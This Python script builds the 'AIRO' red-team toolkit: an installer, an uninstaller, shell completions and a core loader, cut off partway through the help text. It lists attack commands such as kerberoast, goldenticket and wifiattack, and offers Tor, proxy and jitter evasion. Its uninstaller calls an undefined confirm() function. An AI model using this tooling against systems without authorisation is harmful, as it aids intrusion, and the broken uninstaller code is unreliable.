#!/usr/bin/env python3
"""
airo-splitter.py - Build the All In One RedOps (AIRO) toolkit from one script
Creates a complete modular structure from the monolithic script
"""

from pathlib import Path
import textwrap
import hashlib
import urllib.request
import json

def create_directory_structure():
    """Create directory structure"""
    base_dir = Path("airo-redops-v3.2.0")
    dirs = [
        base_dir,
        base_dir / "modules",
        base_dir / "config",
        base_dir / "plugins",
        base_dir / "docs",
        base_dir / "tools",
        base_dir / "tools" / "peas",
        base_dir / "vendors",
    ]
    
    for d in dirs:
        d.mkdir(parents=True, exist_ok=True)
    
    return base_dir

def download_with_verify(url: str, dest: Path, expected_sha256: str):
    """Download a file and verify SHA256. Raises on mismatch."""
    dest.parent.mkdir(parents=True, exist_ok=True)
    with urllib.request.urlopen(url) as r, open(dest, "wb") as f:
        data = r.read()
        f.write(data)
    sha = hashlib.sha256(data).hexdigest()
    if expected_sha256 and sha.lower() != expected_sha256.lower():
        dest.unlink(missing_ok=True)
        raise ValueError(f"SHA256 mismatch for {dest}: got {sha}, expected {expected_sha256}")

def create_install_script(base_dir):
    """Create main installer script"""
    install_content = textwrap.dedent("""\
        #!/usr/bin/env bash
        set -euo pipefail

        XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
        XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"
        XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
        AIRO_HOME="${AIRO_HOME:-$XDG_DATA_HOME/airo}"
        AIRO_CONFIG_DIR="${AIRO_CONFIG_DIR:-$XDG_CONFIG_HOME/airo}"
        AIRO_CACHE_DIR="${AIRO_CACHE_DIR:-$XDG_CACHE_HOME/airo}"
        BIN_TARGET="/usr/local/bin/airo"
        MANIFEST="$AIRO_HOME/install-manifest.txt"
        AIRO_YES="${AIRO_YES:-0}"

        confirm() {
            local prompt="$1"
            if [[ -t 0 ]]; then
                read -p "$prompt" -r
                [[ $REPLY =~ ^[Yy]$ ]]
                return
            fi
            if [[ "$AIRO_YES" == "1" ]]; then
                return 0
            fi
            echo "[-] Non-interactive shell. Set AIRO_YES=1 to proceed."
            return 1
        }
        SRC_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
        AIRO_YES="${AIRO_YES:-0}"

        confirm() {
            local prompt="$1"
            if [[ -t 0 ]]; then
                read -p "$prompt" -r
                [[ $REPLY =~ ^[Yy]$ ]]
                return
            fi
            if [[ "$AIRO_YES" == "1" ]]; then
                return 0
            fi
            echo "[-] Non-interactive shell. Set AIRO_YES=1 to proceed."
            return 1
        }

        rollback() {
            echo "[-] Install failed; rolling back..."
            if [[ -d "$AIRO_HOME" ]]; then
                rm -rf "$AIRO_HOME" || true
            fi
            if [[ -L "$BIN_TARGET" ]]; then
                sudo rm -f "$BIN_TARGET" || true
            fi
        }
        trap rollback ERR

        echo "[*] AIRO will be installed to $AIRO_HOME"
        echo "[*] Config directory: $AIRO_CONFIG_DIR"
        echo "[*] Cache directory: $AIRO_CACHE_DIR"
        if ! confirm "Proceed with install? [y/N]: "; then
            echo "[-] Install cancelled"
            exit 1
        fi

        echo "[*] Creating directories"
        rm -rf "$AIRO_HOME"
        mkdir -p "$AIRO_HOME" "$AIRO_CONFIG_DIR" "$AIRO_CACHE_DIR"

        echo "[*] Copying framework files..."
        cp -a "$SRC_DIR"/{airo-core.sh,modules,config,plugins,docs,tools,vendors} "$AIRO_HOME"/ 2>/dev/null || true
        cp -a "$SRC_DIR"/install_airo_dependencies.sh "$AIRO_HOME"/ 2>/dev/null || true
        cp -a "$SRC_DIR"/config/. "$AIRO_CONFIG_DIR"/ 2>/dev/null || true

        echo "[*] Writing manifest at $MANIFEST"
        find "$AIRO_HOME" -mindepth 1 -printf "%p\\n" | sort > "$MANIFEST"
        if [[ -d "$AIRO_CONFIG_DIR" ]]; then
            find "$AIRO_CONFIG_DIR" -mindepth 1 -printf "%p\\n" | sort >> "$MANIFEST"
            echo "$AIRO_CONFIG_DIR" >> "$MANIFEST"
        fi
        if [[ -d "$AIRO_CACHE_DIR" ]]; then
            echo "$AIRO_CACHE_DIR" >> "$MANIFEST"
        fi
        echo "$BIN_TARGET" >> "$MANIFEST"

        echo "[*] Creating launcher at $BIN_TARGET (sudo may be required)"
        if confirm "Allow sudo to create / update launcher? [y/N]: "; then
            if command -v sudo >/dev/null 2>&1; then
                if [[ -t 0 ]]; then
                    sudo ln -sf "$AIRO_HOME/airo-core.sh" "$BIN_TARGET" || echo "[!] Failed to create launcher"
                else
                    sudo -n ln -sf "$AIRO_HOME/airo-core.sh" "$BIN_TARGET" 2>/dev/null || echo "[!] sudo needs a TTY; skipping launcher"
                fi
            elif [[ $EUID -eq 0 ]]; then
                ln -sf "$AIRO_HOME/airo-core.sh" "$BIN_TARGET" || echo "[!] Failed to create launcher"
            else
                echo "[!] sudo not available; cannot create launcher at $BIN_TARGET"
            fi
        else
            echo "[!] Skipping launcher creation. Add to PATH manually if desired."
        fi

        echo "[*] Installing shell completions"
        COMPLETIONS_DIR="$AIRO_CONFIG_DIR/completions"
        mkdir -p "$COMPLETIONS_DIR"
        cat > "$COMPLETIONS_DIR/airo.bash" << 'BASH_COMP'
_airo_complete() {
    local cur prev cmds
    cur="${COMP_WORDS[COMP_CWORD]}"
    cmds="netscan portscan udpscan alivehosts dnscan safescan lhost myip tracer whoislookup dnsdump cidrcalc \
webscan dirscan fuzzurl sqlcheck xsscheck takeover wpscan joomscan sslscan headerscan httpxprobe wayback katana nuclei \
sysenum sudofind capfind cronfind procmon libfind serviceenum userenum \
lpe wpe sudoexploit kernelcheck winprivesc linprivesc getpeas \
awscheck azcheck gcpcheck s3scan ec2scan dockerscan kubescan containerbreak \
adusers adgroups admachines bloodhound kerberoast asreproast goldenticket silverticket passpol gpppass \
wifiscan wifiattack bluescan blueattack wpscrack handshake pmkidattack rfscan \
apkanalyze apkdecompile ipascan androidscan iotscan firmwareextract bleenum \
emailosint userosint phoneosint domainosint breachcheck leaksearch metadata imageosint \
reconall vulnscan reportgen findings evidence timertrack notify \
urldecode urlencode base64d base64e hexdump filetype calccidr shodanscan censysscan fofascan \
help modules reload update version"
    COMPREPLY=( $(compgen -W "$cmds" -- "$cur") )
}
complete -F _airo_complete airo
BASH_COMP
        cat > "$COMPLETIONS_DIR/airo.zsh" << 'ZSH_COMP'
#compdef airo
_airo() {
  local -a commands
  commands=(
    'netscan:Network scan'
    'portscan:TCP scan'
    'udpscan:UDP scan'
    'alivehosts:Ping sweep'
    'dnscan:DNS subdomain scan'
    'safescan:Safe scan'
    'lhost:Local IP'
    'myip:Public IP'
    'tracer:Traceroute'
    'whoislookup:WHOIS lookup'
    'dnsdump:DNS records'
    'cidrcalc:CIDR calculator'
    'webscan:Web scan'
    'dirscan:Directory scan'
    'fuzzurl:URL fuzz'
    'sqlcheck:SQLi check'
    'xsscheck:XSS check'
    'takeover:Subdomain takeover'
    'wpscan:WordPress scan'
    'joomscan:Joomla scan'
    'sslscan:TLS scan'
    'headerscan:HTTP headers'
    'httpxprobe:HTTP probe'
    'wayback:Wayback URLs'
    'katana:Katana crawl'
    'nuclei:Nuclei scan'
    'sysenum:System enumeration'
    'sudofind:SUID/SGID files'
    'capfind:Capabilities'
    'cronfind:Cron jobs'
    'procmon:Process monitor'
    'libfind:Library check'
    'serviceenum:Service enum'
    'userenum:User enum'
    'lpe:Linux privesc'
    'wpe:Windows privesc'
    'sudoexploit:Sudo checks'
    'kernelcheck:Kernel checks'
    'winprivesc:Windows privesc'
    'linprivesc:Linux privesc'
    'getpeas:Download PEAS'
    'awscheck:AWS checks'
    'azcheck:Azure checks'
    'gcpcheck:GCP checks'
    's3scan:S3 scan'
    'ec2scan:EC2 scan'
    'dockerscan:Docker scan'
    'kubescan:Kubernetes scan'
    'containerbreak:Container breakout'
    'adusers:AD users'
    'adgroups:AD groups'
    'admachines:AD machines'
    'bloodhound:BloodHound'
    'kerberoast:Kerberoast'
    'asreproast:AS-REP roast'
    'goldenticket:Golden ticket'
    'silverticket:Silver ticket'
    'passpol:Password policy'
    'gpppass:GPP passwords'
    'wifiscan:WiFi scan'
    'wifiattack:WiFi attack'
    'bluescan:Bluetooth scan'
    'blueattack:Bluetooth attack'
    'wpscrack:WPS crack'
    'handshake:Handshake guide'
    'pmkidattack:PMKID guide'
    'rfscan:RF scan'
    'apkanalyze:Analyze APK'
    'apkdecompile:Decompile APK'
    'ipascan:iOS scan'
    'androidscan:Android scan'
    'iotscan:IoT scan'
    'firmwareextract:Firmware extract'
    'bleenum:BLE enum'
    'emailosint:Email OSINT'
    'userosint:User OSINT'
    'phoneosint:Phone OSINT'
    'domainosint:Domain OSINT'
    'breachcheck:Breach check'
    'leaksearch:Leak search'
    'metadata:Metadata'
    'imageosint:Image OSINT'
    'reconall:Recon automation'
    'vulnscan:Vuln automation'
    'reportgen:Report template'
    'findings:Findings guide'
    'evidence:Evidence guide'
    'timertrack:Time tracking'
    'notify:Notifications'
    'urldecode:URL decode'
    'urlencode:URL encode'
    'base64d:Base64 decode'
    'base64e:Base64 encode'
    'hexdump:Hex dump'
    'filetype:File type'
    'calccidr:CIDR calc'
    'shodanscan:Shodan'
    'censysscan:Censys'
    'fofascan:Fofa'
    'help:Help'
    'modules:Modules'
    'reload:Reload config'
    'update:Update'
    'version:Version'
  )
  _describe 'command' commands
}
compdef _airo airo
ZSH_COMP

        if [[ -f "$HOME/.bashrc" ]] && ! grep -q "airo.bash" "$HOME/.bashrc"; then
            echo "source \"$COMPLETIONS_DIR/airo.bash\"" >> "$HOME/.bashrc"
        fi
        if [[ -f "$HOME/.zshrc" ]] && ! grep -q "airo.zsh" "$HOME/.zshrc"; then
            echo "source \"$COMPLETIONS_DIR/airo.zsh\"" >> "$HOME/.zshrc"
        fi

        trap - ERR
        echo "[+] Install complete."
        echo "[!] Reload your shell (e.g., 'source ~/.bashrc' or 'source ~/.zshrc')"
        """).lstrip("\n")
    (base_dir / "install.sh").write_text(install_content, encoding='utf-8')
    (base_dir / "install.sh").chmod(0o755)

def create_uninstall_script(base_dir):
    """Create uninstaller script to remove installed files and symlink."""
    uninstall_content = textwrap.dedent("""\
        #!/usr/bin/env bash
        set -euo pipefail

        XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
        XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"
        XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
        AIRO_HOME="${AIRO_HOME:-$XDG_DATA_HOME/airo}"
        AIRO_CONFIG_DIR="${AIRO_CONFIG_DIR:-$XDG_CONFIG_HOME/airo}"
        AIRO_CACHE_DIR="${AIRO_CACHE_DIR:-$XDG_CACHE_HOME/airo}"
        BIN_TARGET="/usr/local/bin/airo"
        MANIFEST="$AIRO_HOME/install-manifest.txt"

        echo "[*] This will remove All In One RedOps (AIRO) from $AIRO_HOME"
        echo "[*] Config directory: $AIRO_CONFIG_DIR"
        echo "[*] Cache directory: $AIRO_CACHE_DIR"
        if ! confirm "Proceed? [y/N]: "; then
            echo "[-] Uninstall cancelled"
            exit 0
        fi

        if [[ -f "$MANIFEST" ]]; then
            echo "[*] Removing files from manifest..."
            if command -v tac >/dev/null 2>&1; then
                tac "$MANIFEST"
            else
                awk '{lines[NR]=$0} END{for(i=NR;i>=1;i--) print lines[i]}' "$MANIFEST"
            fi | while read -r path; do
                if [[ -L "$path" ]]; then
                    if command -v sudo >/dev/null 2>&1; then
                        sudo rm -f "$path" || true
                    else
                        rm -f "$path" || true
                    fi
                elif [[ -f "$path" ]]; then
                    rm -f "$path" || true
                elif [[ -d "$path" ]]; then
                    rm -rf "$path" || true
                fi
            done || true
        else
            echo "[!] Manifest not found; removing $AIRO_HOME and launcher if present."
            rm -rf "$AIRO_HOME" 2>/dev/null || true
            if [[ -L "$BIN_TARGET" ]]; then
                sudo rm -f "$BIN_TARGET"
            fi
        fi

        if [[ -d "$AIRO_HOME" ]]; then
            rm -rf "$AIRO_HOME" || true
            if [[ ! -d "$AIRO_HOME" ]]; then
                echo "[+] Removed $AIRO_HOME"
            else
                echo "[!] Failed to remove $AIRO_HOME"
            fi
        fi

        if [[ -d "$AIRO_CONFIG_DIR" ]]; then
            rm -rf "$AIRO_CONFIG_DIR" || true
            if [[ ! -d "$AIRO_CONFIG_DIR" ]]; then
                echo "[+] Removed $AIRO_CONFIG_DIR"
            else
                echo "[!] Failed to remove $AIRO_CONFIG_DIR"
            fi
        fi

        if [[ -d "$AIRO_CACHE_DIR" ]]; then
            rm -rf "$AIRO_CACHE_DIR" || true
            if [[ ! -d "$AIRO_CACHE_DIR" ]]; then
                echo "[+] Removed $AIRO_CACHE_DIR"
            else
                echo "[!] Failed to remove $AIRO_CACHE_DIR"
            fi
        fi

        if [[ -L "$BIN_TARGET" ]]; then
            if command -v sudo >/dev/null 2>&1; then
                sudo rm -f "$BIN_TARGET" || true
            else
                rm -f "$BIN_TARGET" || true
            fi
            if [[ ! -L "$BIN_TARGET" ]]; then
                echo "[+] Removed launcher symlink at $BIN_TARGET"
            else
                echo "[!] Failed to remove launcher symlink at $BIN_TARGET"
            fi
        elif [[ -f "$BIN_TARGET" ]]; then
            echo "[!] $BIN_TARGET exists but is not a symlink; skipping removal"
        fi

        echo "[*] Uninstall finished. Check your shell rc files for any leftover AIRO entries."
        """).lstrip("\n")
    uninstall_path = base_dir / "uninstall.sh"
    uninstall_path.write_text(uninstall_content, encoding='utf-8')
    uninstall_path.chmod(0o755)

def create_core_loader(base_dir):
    """
    Create the core loader script for the All In One RedOps (AIRO) framework.

    Parameters:
        base_dir (Path): The base directory where the core loader will be created.

    Side Effects:
        - Creates the 'airo-core.sh' file in the specified base directory.
        - Writes the core loader bash script content to this file.
        - Sets the file permissions to executable (0o755).
    """
    core_content = '''#!/usr/bin/env bash
set -euo pipefail
# All In One RedOps (AIRO) Core Loader - Main framework file

AIRO_VERSION="3.2.0"
XDG_CONFIG_HOME="${XDG_CONFIG_HOME:-$HOME/.config}"
XDG_DATA_HOME="${XDG_DATA_HOME:-$HOME/.local/share}"
XDG_CACHE_HOME="${XDG_CACHE_HOME:-$HOME/.cache}"
AIRO_HOME="${AIRO_HOME:-$XDG_DATA_HOME/airo}"
AIRO_CONFIG="${AIRO_CONFIG:-$XDG_CONFIG_HOME/airo}"
AIRO_CACHE="${AIRO_CACHE:-$XDG_CACHE_HOME/airo}"
AIRO_MODULES="$AIRO_HOME/modules"
LEGACY_HOME="$HOME/.airo"
DRY_RUN=0
VERBOSE=0
DEBUG=0
LOG_DIR="$AIRO_CACHE/logs"
LOG_FILE="$LOG_DIR/airo.log"
JSON_LOGGING=0
JSON_LOG_FILE="$LOG_DIR/commands.jsonl"
PROXY=""
TOR=0
USER_AGENT=""
JITTER=0

# Color setup
setup_colors() {
    if [[ -t 2 ]] && [[ -z "${NO_COLOR-}" ]] && [[ "${TERM-}" != "dumb" ]]; then
        RED='\\033[0;31m'
        GREEN='\\033[0;32m'
        YELLOW='\\033[1;33m'
        BLUE='\\033[0;34m'
        CYAN='\\033[0;36m'
        MAGENTA='\\033[0;35m'
        BOLD='\\033[1m'
        NC='\\033[0m'
    else
        RED='' GREEN='' YELLOW='' BLUE='' CYAN='' MAGENTA='' BOLD='' NC=''
    fi
}

# Logging functions
log() { printf "${GREEN}[+]${NC} %s\\n" "$*"; }
warn() { printf "${YELLOW}[!]${NC} %s\\n" "$*" >&2; }
json_escape() {
    local s="$1"
    s="${s//\\\\/\\\\\\\\}"
    s="${s//\"/\\\\\"}"
    s="${s//$'\\n'/ }"
    printf '%s' "$s"
}
rotate_log_file() {
    local file="$1"
    local max_size=10485760
    if [[ -f "$file" ]]; then
        local size
        size=$(wc -c < "$file" 2>/dev/null || echo 0)
        if (( size > max_size )); then
            local i
            for ((i=9; i>=1; i--)); do
                if [[ -f "${file}.${i}" ]]; then
                    mv "${file}.${i}" "${file}.$((i+1))" 2>/dev/null || true
                fi
            done
            mv "$file" "${file}.1" 2>/dev/null || true
        fi
    fi
}
log_json_event() {
    [[ "${JSON_LOGGING:-0}" -eq 1 ]] || return 0
    mkdir -p "$LOG_DIR" 2>/dev/null || true
    rotate_log_file "$JSON_LOG_FILE"
    local event="$1"; shift || true
    local cmd="$1"; shift || true
    local ts
    ts="$(date -u +"%Y-%m-%dT%H:%M:%SZ")"
    local args_json="["
    local arg
    for arg in "$@"; do
        args_json+="\"$(json_escape "$arg")\","
    done
    args_json="${args_json%,}]"
    printf '{"ts":"%s","event":"%s","cmd":"%s","args":%s}\\n' \\
        "$ts" "$(json_escape "$event")" "$(json_escape "$cmd")" "$args_json" >> "$JSON_LOG_FILE" 2>/dev/null || true
}
log_error() {
    mkdir -p "$LOG_DIR" 2>/dev/null || true
    rotate_log_file "$LOG_FILE"
    printf '%s %s\\n' "$(date -u +"%Y-%m-%dT%H:%M:%SZ")" "$*" >> "$LOG_FILE" 2>/dev/null || true
}
error() {
    printf "${RED}[-]${NC} %s\\n" "$*" >&2
    log_error "$*"
}

airo_curl() {
    local args=()
    [[ -n "$PROXY" ]] && args+=(--proxy "$PROXY")
    [[ -n "$USER_AGENT" ]] && args+=(-A "$USER_AGENT")
    curl "${args[@]}" "$@"
}

ensure_dirs() {
    mkdir -p "$AIRO_HOME" "$AIRO_CONFIG" "$AIRO_CACHE" "$LOG_DIR"
}

migrate_legacy_home() {
    if [[ -d "$LEGACY_HOME" && ! -d "$AIRO_HOME" ]]; then
        mkdir -p "$(dirname "$AIRO_HOME")"
        if mv "$LEGACY_HOME" "$AIRO_HOME" 2>/dev/null; then
            ln -s "$AIRO_HOME" "$LEGACY_HOME" 2>/dev/null || true
            warn "Migrated legacy $LEGACY_HOME to $AIRO_HOME"
        fi
    fi
    if [[ -d "$AIRO_HOME/config" && ! -d "$AIRO_CONFIG" ]]; then
        mkdir -p "$AIRO_CONFIG"
        cp -a "$AIRO_HOME/config/." "$AIRO_CONFIG"/ 2>/dev/null || true
    fi
}

trim() {
    local s="$1"
    s="${s#"${s%%[![:space:]]*}"}"
    s="${s%"${s##*[![:space:]]}"}"
    printf '%s' "$s"
}

load_ini_config() {
    local ini="$AIRO_CONFIG/config.ini"
    [[ -f "$ini" ]] || return 0
    local section=""
    while IFS= read -r line || [[ -n "$line" ]]; do
        line="${line%%#*}"
        line="${line%%;*}"
        line="$(trim "$line")"
        [[ -z "$line" ]] && continue
        if [[ "$line" =~ ^\\[(.*)\\]$ ]]; then
            section="${BASH_REMATCH[1]}"
            continue
        fi
        if [[ "$line" == *=* ]]; then
            local key val
            key="$(trim "${line%%=*}")"
            val="$(trim "${line#*=}")"
            case "$key" in
                SAFE_MODE) SAFE_MODE="$val" ;;
                SCAN_DELAY) SCAN_DELAY="$val" ;;
                RATE_LIMIT) RATE_LIMIT="$val" ;;
                MAX_HOSTS) MAX_HOSTS="$val" ;;
                TOOL_TIMEOUT) TOOL_TIMEOUT="$val" ;;
                AUTO_LOAD_MODULES) AUTO_LOAD_MODULES="$val" ;;
                AUDIT_LOGGING) AUDIT_LOGGING="$val" ;;
                WORDLIST_BASE) WORDLIST_BASE="$val" ;;
                WORDLIST_DIRSCAN) WORDLIST_DIRSCAN="$val" ;;
                WORDLIST_FUZZURL) WORDLIST_FUZZURL="$val" ;;
                PROXY) PROXY="$val" ;;
                TOR) TOR="$val" ;;
                USER_AGENT) USER_AGENT="$val" ;;
                JITTER) JITTER="$val" ;;
                JSON_LOGGING) JSON_LOGGING="$val" ;;
                DEBUG) DEBUG="$val" ;;
            esac
        fi
    done < "$ini"
}

apply_env_overrides() {
    [[ -n "${AIRO_SAFE_MODE-}" ]] && SAFE_MODE="$AIRO_SAFE_MODE"
    [[ -n "${AIRO_SCAN_DELAY-}" ]] && SCAN_DELAY="$AIRO_SCAN_DELAY"
    [[ -n "${AIRO_RATE_LIMIT-}" ]] && RATE_LIMIT="$AIRO_RATE_LIMIT"
    [[ -n "${AIRO_MAX_HOSTS-}" ]] && MAX_HOSTS="$AIRO_MAX_HOSTS"
    [[ -n "${AIRO_TOOL_TIMEOUT-}" ]] && TOOL_TIMEOUT="$AIRO_TOOL_TIMEOUT"
    [[ -n "${AIRO_AUTO_LOAD_MODULES-}" ]] && AUTO_LOAD_MODULES="$AIRO_AUTO_LOAD_MODULES"
    [[ -n "${AIRO_AUDIT_LOGGING-}" ]] && AUDIT_LOGGING="$AIRO_AUDIT_LOGGING"
    [[ -n "${AIRO_WORDLIST_BASE-}" ]] && WORDLIST_BASE="$AIRO_WORDLIST_BASE"
    [[ -n "${AIRO_WORDLIST_DIRSCAN-}" ]] && WORDLIST_DIRSCAN="$AIRO_WORDLIST_DIRSCAN"
    [[ -n "${AIRO_WORDLIST_FUZZURL-}" ]] && WORDLIST_FUZZURL="$AIRO_WORDLIST_FUZZURL"
    [[ -n "${AIRO_DEBUG-}" ]] && DEBUG="$AIRO_DEBUG"
    [[ -n "${AIRO_PROXY-}" ]] && PROXY="$AIRO_PROXY"
    [[ -n "${AIRO_TOR-}" ]] && TOR="$AIRO_TOR"
    [[ -n "${AIRO_USER_AGENT-}" ]] && USER_AGENT="$AIRO_USER_AGENT"
    [[ -n "${AIRO_JITTER-}" ]] && JITTER="$AIRO_JITTER"
    [[ -n "${AIRO_JSON_LOG-}" ]] && JSON_LOGGING="$AIRO_JSON_LOG"
}

# Load configuration
load_config() {
    ensure_dirs
    migrate_legacy_home
    if [[ -f "$AIRO_CONFIG/defaults.conf" ]]; then
        if ! source "$AIRO_CONFIG/defaults.conf"; then
            warn "Failed to load config: $AIRO_CONFIG/defaults.conf"
        fi
    fi
    if [[ -f "$AIRO_CONFIG/main.conf" ]]; then
        if ! source "$AIRO_CONFIG/main.conf"; then
            warn "Failed to load config: $AIRO_CONFIG/main.conf"
        fi
    fi
    if [[ -f "$AIRO_CONFIG/user.conf" ]]; then
        if ! source "$AIRO_CONFIG/user.conf"; then
            warn "Failed to load config: $AIRO_CONFIG/user.conf"
        fi
    fi
    load_ini_config
    apply_env_overrides
    
    # Set defaults
    : ${SCAN_DELAY:=0.5}
    : ${RATE_LIMIT:=100}
    : ${SAFE_MODE:=1}
    : ${AUTO_LOAD_MODULES:=1}
    : ${AUDIT_LOGGING:=1}
    : ${MAX_HOSTS:=254}
    : ${TOOL_TIMEOUT:=10}
    : ${WORDLIST_BASE:=$HOME/SecLists}
    : ${WORDLIST_DIRSCAN:=$WORDLIST_BASE/Discovery/Web-Content/common.txt}
    : ${WORDLIST_FUZZURL:=$WORDLIST_BASE/Discovery/Web-Content/raft-medium-words.txt}
    : ${JSON_LOGGING:=0}
    : ${PROXY:=}
    : ${TOR:=0}
    : ${USER_AGENT:=}
    : ${JITTER:=0}
    
    export SCAN_DELAY RATE_LIMIT SAFE_MODE AUTO_LOAD_MODULES AUDIT_LOGGING
    export MAX_HOSTS TOOL_TIMEOUT WORDLIST_BASE WORDLIST_DIRSCAN WORDLIST_FUZZURL
    export AIRO_HOME AIRO_CONFIG AIRO_CACHE AIRO_MODULES
    export JSON_LOGGING PROXY TOR USER_AGENT JITTER DEBUG
}

# Apply runtime flags (e.g., --fast/--delay/--rate-limit/--safe)
apply_runtime_flags() {
    RUNTIME_ARGS=()
    UNSAFE_REQUESTED=0
    FORCE_UNSAFE=0
    while (($#)); do
        case "$1" in
            --fast|--unsafe)
                UNSAFE_REQUESTED=1
                SAFE_MODE=0
                SCAN_DELAY=0
                RATE_LIMIT=${RATE_LIMIT:-10000}
                ;;
            --force)
                FORCE_UNSAFE=1
                ;;
            --safe)
                SAFE_MODE=1
                ;;
            --no-delay)
                SCAN_DELAY=0
                ;;
            --delay=*)
                SCAN_DELAY="${1#--delay=}"
                ;;
            --delay)
                [[ -n "${2-}" ]] && SCAN_DELAY="$2" && shift
                ;;
            --rate-limit=*)
                RATE_LIMIT="${1#--rate-limit=}"
                ;;
            --rate-limit)
                [[ -n "${2-}" ]] && RATE_LIMIT="$2" && shift
                ;;
            --dry-run)
                DRY_RUN=1
                ;;
            --no-dry-run)
                DRY_RUN=0
                ;;
            --verbose)
                VERBOSE=1
                ;;
            --debug)
                DEBUG=1
                ;;
            --no-debug)
                DEBUG=0
                ;;
            --proxy=*)
                PROXY="${1#--proxy=}"
                ;;
            --proxy)
                [[ -n "${2-}" ]] && PROXY="$2" && shift
                ;;
            --tor)
                TOR=1
                ;;
            --user-agent=*)
                USER_AGENT="${1#--user-agent=}"
                ;;
            --user-agent|--ua)
                [[ -n "${2-}" ]] && USER_AGENT="$2" && shift
                ;;
            --ua=*)
                USER_AGENT="${1#--ua=}"
                ;;
            --jitter=*)
                JITTER="${1#--jitter=}"
                ;;
            --jitter)
                [[ -n "${2-}" ]] && JITTER="$2" && shift
                ;;
            --json-log)
                JSON_LOGGING=1
                ;;
            --no-json-log)
                JSON_LOGGING=0
                ;;
            --)
                shift
                RUNTIME_ARGS+=("$@")
                break
                ;;
            *)
                RUNTIME_ARGS+=("$1")
                ;;
        esac
        shift || break
    done
    if [[ $UNSAFE_REQUESTED -eq 1 && $FORCE_UNSAFE -ne 1 ]]; then
        echo "[-] Unsafe/fast mode requested but --force not provided. Aborting." >&2
        exit 1
    fi
    if [[ $UNSAFE_REQUESTED -eq 1 ]]; then
        echo "[!] UNSAFE MODE: Prompts disabled, delays removed, rate limit raised."
    fi
    # Enforce minimum rate limit of 10
    if [[ -n "${RATE_LIMIT:-}" ]]; then
        if (( $(printf "%.0f" "${RATE_LIMIT%%.*}") < 10 )); then
            RATE_LIMIT=10
            echo "[!] RATE_LIMIT raised to minimum of 10 req/sec for safety."
        fi
    fi
    if [[ "${TOR:-0}" -eq 1 && -z "$PROXY" ]]; then
        PROXY="socks5h://127.0.0.1:9050"
    fi
    if [[ -n "$PROXY" ]]; then
        export HTTP_PROXY="$PROXY" HTTPS_PROXY="$PROXY" ALL_PROXY="$PROXY"
    fi
    if [[ -n "$JITTER" && "$JITTER" != "0" ]]; then
        SCAN_DELAY="$(awk -v base="$SCAN_DELAY" -v jitter="$JITTER" 'BEGIN{srand(); d=base+((rand()*2-1)*jitter); if(d<0){d=0} printf "%.3f", d}')"
    fi
    export SAFE_MODE SCAN_DELAY RATE_LIMIT DRY_RUN VERBOSE DEBUG
    export JSON_LOGGING PROXY TOR USER_AGENT JITTER
}

# Load a specific module
load_module() {
    local module="$1"
    if [[ -f "$AIRO_MODULES/$module.sh" ]]; then
        if source "$AIRO_MODULES/$module.sh"; then
            return 0
        fi
        warn "Failed to load module: $AIRO_MODULES/$module.sh"
        return 1
    elif [[ -f "$AIRO_MODULES/$module" ]]; then
        if source "$AIRO_MODULES/$module"; then
            return 0
        fi
        warn "Failed to load module: $AIRO_MODULES/$module"
        return 1
    fi
    warn "Module not found: $module"
    return 1
}

# Load all modules
load_all_modules() {
    for module in "$AIRO_MODULES"/*.sh; do
        if [[ -f "$module" ]]; then
            if ! source "$module"; then
                warn "Failed to load module: $module"
            fi
        fi
    done
}

# Lazy loading system
airo_lazy_load() {
    local cmd="$1"
    local module=""
    
    # Map commands to modules
    case "$cmd" in
        netscan|portscan|udpscan|alivehosts|dnscan|safescan|lhost|myip)
            module="network" ;;
        webscan|dirscan|fuzzurl|sqlcheck|xsscheck|sslscan|wpscan|httpxprobe|wayback|katana|nuclei)
            module="web" ;;
        sysenum|sudofind|capfind|cronfind|procmon|userenum)
            module="system" ;;
        lpe|wpe|sudoexploit|kernelcheck|winprivesc|linprivesc|getpeas)
            module="privesc" ;;
        awscheck|azcheck|gcpcheck|s3scan|ec2scan|dockerscan|kubescan)
            module="cloud" ;;
        adusers|adgroups|admachines|bloodhound|kerberoast|asreproast)
            module="ad" ;;
        wifiscan|wifiattack|bluescan|blueattack|wpscrack|handshake)
            module="wireless" ;;
        apkanalyze|ipascan|androidscan|iotscan|firmwareextract|apkdecompile)
            module="mobile" ;;
        emailosint|userosint|phoneosint|domainosint|breachcheck)
            module="osint" ;;
        reconall|vulnscan|reportgen|findings|evidence|timertrack)
            module="automation" ;;
        urldecode|urlencode|base64d|base64e|hexdump|filetype|calccidr)
            module="utilities" ;;
        *)
            module="" ;;
    esac
    
    if [[ -n "$module" ]]; then
        load_module "$module"
    fi
    
    # Execute the command
    if declare -f "airo_$cmd" >/dev/null 2>&1; then
        local debug_was_on=0
        log_json_event "command.start" "$cmd" "${@:2}"
        if [[ "${DEBUG:-0}" -eq 1 ]]; then
            debug_was_on=1
            set -x
        fi
        if [[ "${DRY_RUN:-0}" -eq 1 ]]; then
            echo "[dry-run] airo $cmd ${*:2}"
            if [[ "${VERBOSE:-0}" -eq 1 ]]; then
                echo "[dry-run] Would execute function: airo_$cmd"
            fi
            log_json_event "command.dry_run" "$cmd" "${@:2}"
            return 0
        fi
        if ! "airo_$cmd" "${@:2}"; then
            local status=$?
            if [[ $debug_was_on -eq 1 ]]; then
                set +x
            fi
            log_json_event "command.error" "$cmd" "${@:2}"
            return $status
        fi
        if [[ $debug_was_on -eq 1 ]]; then
            set +x
        fi
        log_json_event "command.end" "$cmd" "${@:2}"
    else
        error "Command not found: $cmd"
        return 1
    fi
}

# Main airo command
airo() {
    local cmd=""
    apply_runtime_flags "$@"
    set -- "${RUNTIME_ARGS[@]}"
    cmd="${1:-}"
    shift || true
    
    if [[ -z "$cmd" ]] || [[ "$cmd" == "--help" ]] || [[ "$cmd" == "-h" ]]; then
        cat << HELP
All In One RedOps (AIRO) v${AIRO_VERSION}
Modular Edition with 150+ commands

Usage:
  airo <command> [args]      - Execute a command
  airo [flags] <command>     - Run with flags (e.g., --fast)
  airo help                  - Show this help
  airo modules               - List all modules
  airo reload                - Reload configuration
  airo update                - Update framework
  airo version               - Show version
Flags:
